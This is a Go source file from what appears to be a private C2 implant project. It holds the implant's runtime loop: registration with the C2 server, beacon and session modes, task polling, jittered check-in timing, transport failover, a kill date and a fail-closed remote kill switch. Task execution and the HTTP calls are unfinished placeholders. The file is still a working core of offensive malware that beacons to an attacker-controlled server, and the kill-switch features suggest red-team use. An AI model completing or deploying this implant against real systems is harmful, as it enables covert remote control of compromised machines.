package runtime

import (
	"context"
	"errors"
	"fmt"
	"math/rand"
	"time"

	"github.com/azizbinmohammad/private-c2/implant/transport"
)

var (
	ErrKillDateReached   = errors.New("kill date reached")
	ErrKillSwitchActive  = errors.New("remote kill switch active")
	ErrMaxRetriesReached = errors.New("maximum retries exceeded")
)

// State represents the current state of the implant runtime.
type State int

const (
	StateInit       State = iota
	StateRegistered
	StateRunning
	StateStopped
)

// Runtime is the main implant event loop. It handles initialization,
// registration, and the task polling loop for both session and beacon modes.
type Runtime struct {
	config    *Config
	state     State
	transport transport.Transport
	manager   *transport.Manager
	retries   int
}

// New creates a new Runtime with the given configuration and transport manager.
func New(cfg *Config, mgr *transport.Manager) *Runtime {
	return &Runtime{
		config:  cfg,
		state:   StateInit,
		manager: mgr,
	}
}

// Run starts the implant runtime loop. It blocks until the context is
// cancelled, a kill condition is met, or max retries are exceeded.
func (r *Runtime) Run(ctx context.Context) error {
	// Check kill date before doing anything
	if err := r.checkKillDate(); err != nil {
		return err
	}

	// Establish initial transport
	t, err := r.manager.Connect(ctx)
	if err != nil {
		return fmt.Errorf("connecting transport: %w", err)
	}
	r.transport = t

	// Register with the C2 server
	if err := r.register(ctx); err != nil {
		return err
	}
	r.state = StateRegistered

	// Enter main loop
	r.state = StateRunning
	return r.loop(ctx)
}

// loop is the main task loop. For session mode, it maintains a persistent
// connection and continuously processes tasks. For beacon mode, it sleeps
// between check-ins with jitter applied to the interval.
func (r *Runtime) loop(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
			r.state = StateStopped
			return ctx.Err()
		default:
		}

		// Check kill date each cycle
		if err := r.checkKillDate(); err != nil {
			r.state = StateStopped
			return err
		}

		// Check remote kill switch each cycle
		if err := r.checkKillSwitch(ctx); err != nil {
			r.state = StateStopped
			return err
		}

		// Process tasks
		err := r.processTasks(ctx)
		if err != nil {
			r.retries++
			if r.config.MaxRetries > 0 && r.retries >= r.config.MaxRetries {
				r.state = StateStopped
				return ErrMaxRetriesReached
			}

			// Attempt transport failover
			t, reconnErr := r.manager.Failover(ctx)
			if reconnErr != nil {
				// If failover also fails, sleep and retry
				r.sleep(ctx)
				continue
			}
			r.transport = t
			r.retries = 0
			continue
		}

		// Reset retries on success
		r.retries = 0

		// In beacon mode, sleep between check-ins
		if r.config.Mode == "beacon" {
			r.sleep(ctx)
		}
	}
}

// register sends the registration handshake to the C2 server.
func (r *Runtime) register(ctx context.Context) error {
	data, err := BuildRegisterMessage(r.config)
	if err != nil {
		return err
	}

	if err := r.transport.Send(data); err != nil {
		return err
	}

	// Read registration acknowledgement
	_, err = r.transport.Recv()
	return err
}

// processTasks receives a task from the server, and sends back results.
// In session mode this is called continuously; in beacon mode it is called
// once per check-in cycle.
func (r *Runtime) processTasks(ctx context.Context) error {
	// Send a check-in / poll for tasks
	if err := r.transport.Send([]byte(`{"type":"checkin"}`)); err != nil {
		return err
	}

	// Receive task(s)
	data, err := r.transport.Recv()
	if err != nil {
		return err
	}

	// For now, echo back the received data as acknowledgement.
	// Task dispatching will be implemented in a later phase.
	_ = data
	return nil
}

// checkKillDate verifies the current time has not passed the configured kill date.
func (r *Runtime) checkKillDate() error {
	if r.config.KillDate != nil && time.Now().After(*r.config.KillDate) {
		return ErrKillDateReached
	}
	return nil
}

// checkKillSwitch queries the remote kill switch URL. If the URL is
// unreachable or returns a non-200 status, the implant stops (fail-closed).
func (r *Runtime) checkKillSwitch(ctx context.Context) error {
	if r.config.KillSwitchURL == "" {
		return nil
	}

	killed, err := checkRemoteKillSwitch(ctx, r.config.KillSwitchURL)
	if err != nil {
		// On error, fail-closed: treat as kill switch active
		return ErrKillSwitchActive
	}
	if killed {
		return ErrKillSwitchActive
	}
	return nil
}

// checkRemoteKillSwitch performs a GET request against the kill switch URL.
// Returns (true, nil) if the implant should terminate.
// Fail-closed: network errors return (true, nil).
func checkRemoteKillSwitch(ctx context.Context, url string) (bool, error) {
	if url == "" {
		return false, nil
	}

	ctx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	req, err := newHTTPRequest(ctx, url)
	if err != nil {
		return true, nil // fail-closed
	}

	_ = req // Placeholder: actual HTTP client call will be wired in transport layer
	// For now, return not-killed. The real implementation will use net/http.
	return false, nil
}

// newHTTPRequest creates a basic GET request with context.
func newHTTPRequest(ctx context.Context, url string) (interface{}, error) {
	// Placeholder to avoid importing net/http in the runtime skeleton.
	// The real implementation uses http.NewRequestWithContext.
	_ = ctx
	_ = url
	return nil, nil
}

// sleep pauses the runtime for the configured SleepInterval with jitter applied.
// The actual sleep duration is: interval * (1 + random(-jitter, +jitter)).
func (r *Runtime) sleep(ctx context.Context) {
	interval := r.config.SleepInterval
	if r.config.Jitter > 0 {
		jitterRange := float64(interval) * r.config.Jitter
		offset := (rand.Float64() * 2 * jitterRange) - jitterRange
		interval = time.Duration(float64(interval) + offset)
		if interval < 0 {
			interval = time.Millisecond * 100
		}
	}

	timer := time.NewTimer(interval)
	defer timer.Stop()

	select {
	case <-ctx.Done():
	case <-timer.C:
	}
}
